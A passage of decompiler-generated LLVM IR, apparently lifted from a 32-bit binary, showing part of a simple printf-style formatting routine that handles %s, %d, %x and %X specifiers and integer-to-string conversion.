dec_label_pc_8048497:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484ac = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_8048597

dec_label_pc_80484bc:                             ; preds = %entry
  %v4_80484bc = icmp eq i32 %tmp28, 0
  br i1 %v4_80484bc, label %dec_label_pc_80484dd, label %dec_label_pc_80484c2

dec_label_pc_80484c2:                             ; preds = %dec_label_pc_80484bc
  %v12_80484c2 = icmp eq i32 %tmp27, 10
  %v1_80484c6 = icmp eq i1 %v12_80484c2, false
  br i1 %v1_80484c6, label %dec_label_pc_80484dd, label %dec_label_pc_80484c8

dec_label_pc_80484c8:                             ; preds = %dec_label_pc_80484c2
  %v1_80484cc = icmp eq i1 %v5_8048491, false
  br i1 %v1_80484cc, label %dec_label_pc_80484dd, label %dec_label_pc_80484ce

dec_label_pc_80484ce:                             ; preds = %dec_label_pc_80484c8
  %v1_80484d8 = sub i32 0, %tmp35
  %v5_80484da = sext i32 %v1_80484d8 to i64
  br label %dec_label_pc_80484dd

dec_label_pc_80484dd:                             ; preds = %dec_label_pc_80484c8, %dec_label_pc_80484c2, %dec_label_pc_80484bc, %dec_label_pc_80484ce
  %stack_var_-24.0 = phi i64 [ %v5_804848e, %dec_label_pc_80484bc ], [ %v5_804848e, %dec_label_pc_80484c2 ], [ %v5_804848e, %dec_label_pc_80484c8 ], [ %v5_80484da, %dec_label_pc_80484ce ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484bc ], [ 0, %dec_label_pc_80484c2 ], [ 0, %dec_label_pc_80484c8 ], [ 1, %dec_label_pc_80484ce ]
  %v15_80484e0 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_804853e7 = trunc i64 %stack_var_-24.0 to i32
  %v5_804853e8 = icmp eq i32 %v4_804853e7, 0
  %v1_804854215 = icmp eq i1 %v5_804853e8, false
  br i1 %v1_804854215, label %dec_label_pc_80484ee.lr.ph, label %dec_label_pc_8048544

dec_label_pc_80484ee.lr.ph:                       ; preds = %dec_label_pc_80484dd
  %v5_80484f1 = sext i32 %tmp27 to i64
  br label %dec_label_pc_80484ee

dec_label_pc_80484ee:                             ; preds = %dec_label_pc_80484ee.lr.ph, %dec_label_pc_8048516
  %v3_804851618 = phi i8* [ %tmp48, %dec_label_pc_80484ee.lr.ph ], [ %v22_8048516, %dec_label_pc_8048516 ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_80484ee.lr.ph ], [ %v5_804853b, %dec_label_pc_8048516 ]
  %v6_80484fc = and i64 %stack_var_-24.116, 4294967295
  %v12_80484fc = udiv i64 %v6_80484fc, %v5_80484f1
  %v13_80484fc = trunc i64 %v12_80484fc to i32
  %v14_80484fc = urem i64 %v6_80484fc, %v5_80484f1
  %v5_8048501 = trunc i64 %v14_80484fc to i8
  %v7_8048508 = icmp sgt i8 %v5_8048501, 9
  br i1 %v7_8048508, label %dec_label_pc_804850a, label %dec_label_pc_8048516

dec_label_pc_804850a:                             ; preds = %dec_label_pc_80484ee
  %tmp52 = trunc i64 %v14_80484fc to i32
  %v5_804850d = add i32 %tmp52, %tmp
  %v1_8048510 = add i32 %v5_804850d, 198
  %v11_8048510 = trunc i32 %v1_8048510 to i8
  br label %dec_label_pc_8048516

dec_label_pc_8048516:                             ; preds = %dec_label_pc_80484ee, %dec_label_pc_804850a
  %stack_var_-36.0 = phi i8 [ %v11_8048510, %dec_label_pc_804850a ], [ %v5_8048501, %dec_label_pc_80484ee ]
  %v4_8048516 = ptrtoint i8* %v3_804851618 to i32
  %v5_8048516 = add i32 %v4_8048516, -1
  %v22_8048516 = inttoptr i32 %v5_8048516 to i8*
  %v1_804851c = add i8 %stack_var_-36.0, 48
  store i8 %v1_804851c, i8* %v22_8048516, align 1
  %v5_804853b = sext i32 %v13_80484fc to i64
  %v5_804853e = icmp eq i32 %v13_80484fc, 0
  %v1_8048542 = icmp eq i1 %v5_804853e, false
  br i1 %v1_8048542, label %dec_label_pc_80484ee, label %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge

dec_label_pc_804853e.dec_label_pc_8048544_crit_edge: ; preds = %dec_label_pc_8048516
  store i8* %v22_8048516, i8** %stack_var_-40, align 4
  br label %dec_label_pc_8048544

dec_label_pc_8048544:                             ; preds = %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge, %dec_label_pc_80484dd
  %v3_8048581622 = phi i32 [ %v5_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %v15_80484e0, %dec_label_pc_80484dd ]
  %v3_8048572 = phi i8* [ %v22_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %tmp48, %dec_label_pc_80484dd ]
  %v4_8048544 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_8048544, label %dec_label_pc_804857b, label %dec_label_pc_804854a

dec_label_pc_804854a:                             ; preds = %dec_label_pc_8048544
  %v4_804854a = icmp eq i32 %tmp31, 0
  br i1 %v4_804854a, label %dec_label_pc_8048572, label %dec_label_pc_8048550

dec_label_pc_8048550:                             ; preds = %dec_label_pc_804854a
  %v1_8048553 = and i32 %tmp32, 2
  %v2_8048553 = icmp eq i32 %v1_8048553, 0
  br i1 %v2_8048553, label %dec_label_pc_8048572, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_8048550
  %v3_8048562 = inttoptr i32 %arg1 to i32*
  %v4_8048562 = call i32 @printchar(i32* %v3_8048562, i32 45)
  %v4_804856d = add i32 %tmp31, -1
  br label %dec_label_pc_804857b

dec_label_pc_8048572:                             ; preds = %dec_label_pc_8048550, %dec_label_pc_804854a
  %v4_8048572 = ptrtoint i8* %v3_8048572 to i32
  %v5_8048572 = add i32 %v4_8048572, -1
  %v22_8048572 = inttoptr i32 %v5_8048572 to i8*
  store i8* %v22_8048572, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_8048572, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80485816.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804857b

dec_label_pc_804857b:                             ; preds = %dec_label_pc_8048544, %dec_label_pc_804855a, %dec_label_pc_8048572
  %v3_80485816 = phi i32 [ %v3_8048581622, %dec_label_pc_8048544 ], [ %v3_80485816.pre, %dec_label_pc_8048572 ], [ %v3_8048581622, %dec_label_pc_804855a ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_8048544 ], [ %tmp31, %dec_label_pc_8048572 ], [ %v4_804856d, %dec_label_pc_804855a ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048544 ], [ 0, %dec_label_pc_8048572 ], [ 1, %dec_label_pc_804855a ]
  %v1_8048587.cast = inttoptr i32 %v3_80485816 to i8*
  %v6_8048587 = call i32 @prints(i32 %arg1, i8* %v1_8048587.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_8048592 = add i32 %v6_8048587, %stack_var_-28.0
  store i32 %v2_8048592, i32* @edx, align 4
  br label %dec_label_pc_8048597

dec_label_pc_8048597:                             ; preds = %dec_label_pc_8048497, %dec_label_pc_804857b
  %storemerge = phi i32 [ %v2_8048592, %dec_label_pc_804857b ], [ %v6_80484ac, %dec_label_pc_8048497 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_8048516, { 0, 1, 3, 2 }
  uselistorder i8 %v5_8048501, { 1, 0 }
  uselistorder i64 %v6_80484fc, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048597, { 1, 0 }
  uselistorder label %dec_label_pc_804857b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048516, { 1, 0 }
  uselistorder label %dec_label_pc_80484ee, { 1, 0 }
  uselistorder label %dec_label_pc_80484dd, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804859c = load i32, i32* @ebp, align 4
  store i32 %v0_804859c, i32* %stack_var_-4, align 4
  %v15_804859f = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048791 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.444 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80487c745 = load i8, i8* %stack_var_8.444, align 1
  %v3_80487c746 = zext i8 %v2_80487c745 to i32
  %v5_80487c747 = and i32 %arg2, -256
  %v6_80487c748 = or i32 %v3_80487c746, %v5_80487c747
  store i32 %v6_80487c748, i32* %eax.global-to-local, align 4
  %v4_80487c949 = icmp eq i8 %v2_80487c745, 0
  %v1_80487cb50 = icmp eq i1 %v4_80487c949, false
  br i1 %v1_80487cb50, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80485ae:                             ; preds = %entry, %dec_label_pc_80487c1
  %v0_80487af = phi i32 [ %v4_804867366, %dec_label_pc_80487c1 ], [ %v15_804859f, %entry ]
  %v5_80487c756 = phi i32 [ %v5_80487c7, %dec_label_pc_80487c1 ], [ %v5_80487c747, %entry ]
  %stack_var_8.455 = phi i8* [ %stack_var_8.4, %dec_label_pc_80487c1 ], [ %stack_var_8.444, %entry ]
  %stack_var_-28.154 = phi i32 [ %stack_var_-28.0, %dec_label_pc_80487c1 ], [ 0, %entry ]
  %stack_var_8.4.in53 = phi i32 [ %v5_80487c1, %dec_label_pc_80487c1 ], [ %arg2, %entry ]
  %stack_var_12.152 = phi i32 [ %stack_var_12.0, %dec_label_pc_80487c1 ], [ %arg3, %entry ]
  %stack_var_-24.151 = phi i32 [ %stack_var_-24.0, %dec_label_pc_80487c1 ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in53, i32* %eax.global-to-local, align 4
  %v2_80485b1 = load i8, i8* %stack_var_8.455, align 1
  %v3_80485b1 = zext i8 %v2_80485b1 to i32
  %v6_80485b1 = or i32 %v3_80485b1, %v5_80487c756
  store i32 %v6_80485b1, i32* %eax.global-to-local, align 4
  %v10_80485b3 = icmp eq i8 %v2_80485b1, 37
  %v1_80485b5 = icmp eq i1 %v10_80485b3, false
  br i1 %v1_80485b5, label %dec_label_pc_80487a5, label %dec_label_pc_80485bb

dec_label_pc_80485bb:                             ; preds = %dec_label_pc_80485ae
  %v5_80485bb = add i32 %stack_var_8.4.in53, 1
  %v22_80485bb = inttoptr i32 %v5_80485bb to i8*
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485ce = load i8, i8* %v22_80485bb, align 1
  %v3_80485ce = zext i8 %v2_80485ce to i32
  %v5_80485ce = and i32 %v5_80485bb, -256
  %v6_80485ce = or i32 %v3_80485ce, %v5_80485ce
  store i32 %v6_80485ce, i32* %eax.global-to-local, align 4
  %v4_80485d0 = icmp eq i8 %v2_80485ce, 0
  br i1 %v4_80485d0, label %dec_label_pc_80487d1, label %dec_label_pc_80485d8

dec_label_pc_80485d8:                             ; preds = %dec_label_pc_80485bb
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485db = load i8, i8* %v22_80485bb, align 1
  %v3_80485db = zext i8 %v2_80485db to i32
  %v6_80485db = or i32 %v3_80485db, %v5_80485ce
  store i32 %v6_80485db, i32* %eax.global-to-local, align 4
  %v10_80485dd = icmp eq i8 %v2_80485db, 37
  br i1 %v10_80485dd, label %dec_label_pc_80487a5, label %dec_label_pc_80485e5

dec_label_pc_80485e5:                             ; preds = %dec_label_pc_80485d8
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485e8 = load i8, i8* %v22_80485bb, align 1
  %v3_80485e8 = zext i8 %v2_80485e8 to i32
  %v6_80485e8 = or i32 %v3_80485e8, %v5_80485ce
  store i32 %v6_80485e8, i32* %eax.global-to-local, align 4
  %v10_80485ea = icmp eq i8 %v2_80485e8, 45
  %v1_80485ec = icmp eq i1 %v10_80485ea, false
  br i1 %v1_80485ec, label %dec_label_pc_8048601.preheader, label %dec_label_pc_80485ee

dec_label_pc_80485ee:                             ; preds = %dec_label_pc_80485e5
  %v5_80485ee = add i32 %stack_var_8.4.in53, 2
  %v22_80485ee = inttoptr i32 %v5_80485ee to i8*
  br label %dec_label_pc_8048601.preheader

dec_label_pc_8048601.preheader:                   ; preds = %dec_label_pc_80485ee, %dec_label_pc_80485e5
  %stack_var_8.0.ph = phi i8* [ %v22_80485bb, %dec_label_pc_80485e5 ], [ %v22_80485ee, %dec_label_pc_80485ee ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_80485e5 ], [ 1, %dec_label_pc_80485ee ]
  %v4_804860115 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804860115, i32* %eax.global-to-local, align 4
  %v2_804860416 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804860417 = zext i8 %v2_804860416 to i32
  %v5_804860418 = and i32 %v4_804860115, -256
  %v6_804860419 = or i32 %v3_804860417, %v5_804860418
  store i32 %v6_804860419, i32* %eax.global-to-local, align 4
  %v7_804860621 = icmp eq i8 %v2_804860416, 48
  br i1 %v7_804860621, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_80485fa:                             ; preds = %dec_label_pc_8048601.preheader, %dec_label_pc_80485fa
  %v4_804860123 = phi i32 [ %v5_80485fa, %dec_label_pc_80485fa ], [ %v4_804860115, %dec_label_pc_8048601.preheader ]
  %stack_var_-32.022 = phi i32 [ %v4_80485fd, %dec_label_pc_80485fa ], [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ]
  %v5_80485fa = add i32 %v4_804860123, 1
  %v22_80485fa = inttoptr i32 %v5_80485fa to i8*
  %v4_80485fd = or i32 %stack_var_-32.022, 2
  store i32 %v5_80485fa, i32* %eax.global-to-local, align 4
  %v2_8048604 = load i8, i8* %v22_80485fa, align 1
  %v3_8048604 = zext i8 %v2_8048604 to i32
  %v5_8048604 = and i32 %v5_80485fa, -256
  %v6_8048604 = or i32 %v3_8048604, %v5_8048604
  store i32 %v6_8048604, i32* %eax.global-to-local, align 4
  %v7_8048606 = icmp eq i8 %v2_8048604, 48
  br i1 %v7_8048606, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_8048630.preheader:                   ; preds = %dec_label_pc_80485fa, %dec_label_pc_8048601.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ], [ %v4_80485fd, %dec_label_pc_80485fa ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_8048601.preheader ], [ %v22_80485fa, %dec_label_pc_80485fa ]
  %v4_804863025 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_804863025, i32* %eax.global-to-local, align 4
  %v2_804863326 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_804863327 = zext i8 %v2_804863326 to i32
  %v5_804863328 = and i32 %v4_804863025, -256
  %v6_804863329 = or i32 %v3_804863327, %v5_804863328
  store i32 %v6_804863329, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_804863326, 48
  br i1 %tmp67, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_804860c:                             ; preds = %dec_label_pc_8048639
  %v2_8048615 = mul i32 %stack_var_-36.032, 10
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804861d = load i8, i8* %stack_var_8.133, align 1
  %v3_804861d = zext i8 %v2_804861d to i32
  %v5_8048624 = add i32 %v3_804861d, %v2_8048615
  %v1_8048627 = add i32 %v5_8048624, -48
  %v5_804862d = add i32 %v4_804863034, 1
  %v22_804862d = inttoptr i32 %v5_804862d to i8*
  store i32 %v5_804862d, i32* %eax.global-to-local, align 4
  %v2_8048633 = load i8, i8* %v22_804862d, align 1
  %v3_8048633 = zext i8 %v2_8048633 to i32
  %v5_8048633 = and i32 %v5_804862d, -256
  %v6_8048633 = or i32 %v3_8048633, %v5_8048633
  store i32 %v6_8048633, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i8 %v2_8048633, 48
  br i1 %tmp68, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_8048639:                             ; preds = %dec_label_pc_8048630.preheader, %dec_label_pc_804860c
  %v5_804863335 = phi i32 [ %v5_8048633, %dec_label_pc_804860c ], [ %v5_804863328, %dec_label_pc_8048630.preheader ]
  %v4_804863034 = phi i32 [ %v5_804862d, %dec_label_pc_804860c ], [ %v4_804863025, %dec_label_pc_8048630.preheader ]
  %stack_var_8.133 = phi i8* [ %v22_804862d, %dec_label_pc_804860c ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ]
  %stack_var_-36.032 = phi i32 [ %v1_8048627, %dec_label_pc_804860c ], [ 0, %dec_label_pc_8048630.preheader ]
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804863c = load i8, i8* %stack_var_8.133, align 1
  %v3_804863c = zext i8 %v2_804863c to i32
  %v6_804863c = or i32 %v3_804863c, %v5_804863335
  store i32 %v6_804863c, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i8 %v2_804863c, 58
  br i1 %tmp69, label %dec_label_pc_804860c, label %dec_label_pc_8048642

dec_label_pc_8048642:                             ; preds = %dec_label_pc_804860c, %dec_label_pc_8048639, %dec_label_pc_8048630.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_8048630.preheader ], [ %stack_var_-36.032, %dec_label_pc_8048639 ], [ %v1_8048627, %dec_label_pc_804860c ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ], [ %stack_var_8.133, %dec_label_pc_8048639 ], [ %v22_804862d, %dec_label_pc_804860c ]
  %v4_8048630.lcssa = phi i32 [ %v4_804863025, %dec_label_pc_8048630.preheader ], [ %v4_804863034, %dec_label_pc_8048639 ], [ %v5_804862d, %dec_label_pc_804860c ]
  %v5_8048633.lcssa = phi i32 [ %v5_804863328, %dec_label_pc_8048630.preheader ], [ %v5_804863335, %dec_label_pc_8048639 ], [ %v5_8048633, %dec_label_pc_804860c ]
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048645 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048645 = zext i8 %v2_8048645 to i32
  %v6_8048645 = or i32 %v3_8048645, %v5_8048633.lcssa
  store i32 %v6_8048645, i32* %eax.global-to-local, align 4
  %v10_8048647 = icmp eq i8 %v2_8048645, 115
  %v1_8048649 = icmp eq i1 %v10_8048647, false
  br i1 %v1_8048649, label %dec_label_pc_804868d, label %dec_label_pc_804864b

dec_label_pc_804864b:                             ; preds = %dec_label_pc_8048642
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804864e = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048656 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048656 = load i32, i32* %v1_8048656, align 4
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v4_804865b = icmp eq i32 %v2_8048656, 0
  br i1 %v4_804865b, label %dec_label_pc_8048670, label %dec_label_pc_8048661

dec_label_pc_8048661:                             ; preds = %dec_label_pc_804864b
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v5_8048664 = inttoptr i32 %v2_8048656 to i8*
  br label %dec_label_pc_8048670

dec_label_pc_8048670:                             ; preds = %dec_label_pc_804864b, %dec_label_pc_8048661
  %storemerge = phi i8* [ %v5_8048664, %dec_label_pc_8048661 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805814d.12, i32 0, i32 0), %dec_label_pc_804864b ]
  %v4_8048670 = ptrtoint i8* %storemerge to i32
  store i32 %v4_8048670, i32* %eax.global-to-local, align 4
  %v5_8048673 = add i32 %v0_80487af, -4
  %v6_8048673 = inttoptr i32 %v5_8048673 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048673, align 4
  %v5_8048676 = add i32 %v0_80487af, -8
  %v6_8048676 = inttoptr i32 %v5_8048676 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048676, align 4
  %v0_8048679 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048679 = add i32 %v0_80487af, -12
  %v3_8048679 = inttoptr i32 %v2_8048679 to i32*
  store i32 %v0_8048679, i32* %v3_8048679, align 4
  %v5_804867a = add i32 %v0_80487af, -16
  %v6_804867a = inttoptr i32 %v5_804867a to i32*
  store i32 %tmp3, i32* %v6_804867a, align 4
  %v5_804867d = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_804867d = call i32 @prints(i32 %v4_8048670, i8* %v5_804867d, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.154)
  store i32 %v6_804867d, i32* %eax.global-to-local, align 4
  %v0_8048682 = load i32, i32* @esp, align 4
  %v1_8048682 = add i32 %v0_8048682, 16
  %v5_8048685 = add i32 %v6_804867d, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048642
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048690 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048690 = zext i8 %v2_8048690 to i32
  %v6_8048690 = or i32 %v3_8048690, %v5_8048633.lcssa
  store i32 %v6_8048690, i32* %eax.global-to-local, align 4
  %v10_8048692 = icmp eq i8 %v2_8048690, 100
  %v1_8048694 = icmp eq i1 %v10_8048692, false
  br i1 %v1_8048694, label %dec_label_pc_80486c6, label %dec_label_pc_8048696

dec_label_pc_8048696:                             ; preds = %dec_label_pc_804868d
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048699 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486a1 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486a1 = load i32, i32* %v1_80486a1, align 4
  store i32 %v2_80486a1, i32* %eax.global-to-local, align 4
  %v1_80486a6 = add i32 %v0_80487af, -8
  %v2_80486a6 = inttoptr i32 %v1_80486a6 to i32*
  store i32 97, i32* %v2_80486a6, align 4
  %v5_80486a8 = add i32 %v0_80487af, -12
  %v6_80486a8 = inttoptr i32 %v5_80486a8 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486a8, align 4
  %v5_80486ab = add i32 %v0_80487af, -16
  %v6_80486ab = inttoptr i32 %v5_80486ab to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486ab, align 4
  %v1_80486ae = add i32 %v0_80487af, -20
  %v2_80486ae = inttoptr i32 %v1_80486ae to i32*
  store i32 1, i32* %v2_80486ae, align 4
  %v1_80486b0 = add i32 %v0_80487af, -24
  %v2_80486b0 = inttoptr i32 %v1_80486b0 to i32*
  store i32 10, i32* %v2_80486b0, align 4
  %v0_80486b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80486b2 = add i32 %v0_80487af, -28
  %v3_80486b2 = inttoptr i32 %v2_80486b2 to i32*
  store i32 %v0_80486b2, i32* %v3_80486b2, align 4
  %v5_80486b3 = add i32 %v0_80487af, -32
  %v6_80486b3 = inttoptr i32 %v5_80486b3 to i32*
  store i32 %tmp3, i32* %v6_80486b3, align 4
  %v1_80486b6 = call i32 @printi(i32 %v1_8048699)
  store i32 %v1_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esp, align 4
  %v1_80486bb = add i32 %v0_80486bb, 32
  %v5_80486be = add i32 %v1_80486b6, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486c6:                             ; preds = %dec_label_pc_804868d
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486c9 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486c9 = zext i8 %v2_80486c9 to i32
  %v6_80486c9 = or i32 %v3_80486c9, %v5_8048633.lcssa
  store i32 %v6_80486c9, i32* %eax.global-to-local, align 4
  %v10_80486cb = icmp eq i8 %v2_80486c9, 120
  %v1_80486cd = icmp eq i1 %v10_80486cb, false
  br i1 %v1_80486cd, label %dec_label_pc_80486ff, label %dec_label_pc_80486cf

dec_label_pc_80486cf:                             ; preds = %dec_label_pc_80486c6
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_80486d2 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486da = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486da = load i32, i32* %v1_80486da, align 4
  store i32 %v2_80486da, i32* %eax.global-to-local, align 4
  %v1_80486df = add i32 %v0_80487af, -8
  %v2_80486df = inttoptr i32 %v1_80486df to i32*
  store i32 97, i32* %v2_80486df, align 4
  %v5_80486e1 = add i32 %v0_80487af, -12
  %v6_80486e1 = inttoptr i32 %v5_80486e1 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486e1, align 4
  %v5_80486e4 = add i32 %v0_80487af, -16
  %v6_80486e4 = inttoptr i32 %v5_80486e4 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486e4, align 4
  %v1_80486e7 = add i32 %v0_80487af, -20
  %v2_80486e7 = inttoptr i32 %v1_80486e7 to i32*
  store i32 0, i32* %v2_80486e7, align 4
  %v1_80486e9 = add i32 %v0_80487af, -24
  %v2_80486e9 = inttoptr i32 %v1_80486e9 to i32*
  store i32 16, i32* %v2_80486e9, align 4
  %v0_80486eb = load i32, i32* %eax.global-to-local, align 4
  %v2_80486eb = add i32 %v0_80487af, -28
  %v3_80486eb = inttoptr i32 %v2_80486eb to i32*
  store i32 %v0_80486eb, i32* %v3_80486eb, align 4
  %v5_80486ec = add i32 %v0_80487af, -32
  %v6_80486ec = inttoptr i32 %v5_80486ec to i32*
  store i32 %tmp3, i32* %v6_80486ec, align 4
  %v1_80486ef = call i32 @printi(i32 %v1_80486d2)
  store i32 %v1_80486ef, i32* %eax.global-to-local, align 4
  %v0_80486f4 = load i32, i32* @esp, align 4
  %v1_80486f4 = add i32 %v0_80486f4, 32
  %v5_80486f7 = add i32 %v1_80486ef, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486ff:                             ; preds = %dec_label_pc_80486c6
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048702 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048702 = zext i8 %v2_8048702 to i32
  %v6_8048702 = or i32 %v3_8048702, %v5_8048633.lcssa
  store i32 %v6_8048702, i32* %eax.global-to-local, align 4
  %v10_8048704 = icmp eq i8 %v2_8048702, 88
  %v1_8048706 = icmp eq i1 %v10_8048704, false
  br i1 %v1_8048706, label %dec_label_pc_8048738, label %dec_label_pc_8048708

dec_label_pc_8048708:                             ; preds = %dec_label_pc_80486ff
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804870b = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048713 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048713 = load i32, i32* %v1_8048713, align 4
  store i32 %v2_8048713, i32* %eax.global-to-local, align 4
  %v1_8048718 = add i32 %v0_80487af, -8
  %v2_8048718 = inttoptr i32 %v1_8048718 to i32*
  store i32 65, i32* %v2_8048718, align 4
  %v5_804871a = add i32 %v0_80487af, -12
  %v6_804871a = inttoptr i32 %v5_804871a to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804871a, align 4
  %v5_804871d = add i32 %v0_80487af, -16
  %v6_804871d = inttoptr i32 %v5_804871d to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804871d, align 4
  %v1_8048720 = add i32 %v0_80487af, -20
  %v2_8048720 = inttoptr i32 %v1_8048720 to i32*
  store i32 0, i32* %v2_8048720, align 4
  %v1_8048722 = add i32 %v0_80487af, -24
  %v2_8048722 = inttoptr i32 %v1_8048722 to i32*
  store i32 16, i32* %v2_8048722, align 4
  %v0_8048724 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048724 = add i32 %v0_80487af, -28
  %v3_8048724 = inttoptr i32 %v2_8048724 to i32*
  store i32 %v0_8048724, i32* %v3_8048724, align 4
  %v5_8048725 = add i32 %v0_80487af, -32
  %v6_8048725 = inttoptr i32 %v5_8048725 to i32*
  store i32 %tmp3, i32* %v6_8048725, align 4
  %v1_8048728 = call i32 @printi(i32 %v1_804870b)
  store i32 %v1_8048728, i32* %eax.global-to-local, align 4
  %v0_804872d = load i32, i32* @esp, align 4
  %v1_804872d = add i32 %v0_804872d, 32
  %v5_8048730 = add i32 %v1_8048728, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_8048738:                             ; preds = %dec_label_pc_80486ff
